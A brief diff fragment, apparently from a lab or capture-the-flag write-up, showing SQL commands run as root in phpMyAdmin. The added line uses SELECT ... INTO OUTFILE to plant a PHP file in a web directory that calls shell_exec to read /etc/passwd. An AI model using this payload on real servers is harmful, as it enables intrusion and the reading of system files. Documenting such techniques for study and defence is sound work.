@@ -66,3 +66,6 @@ Now logged as root on the phpmyadmin page, we can test some SQL command.
 SELECT @ @version
 5.5.44-0ubuntu0.12.04.1
 
+
+
+select "<?php $output = shell_exec('cat /etc/passwd'); echo $output ?>" into outfile "/var/www/forum/templates_c/passwdd.php"
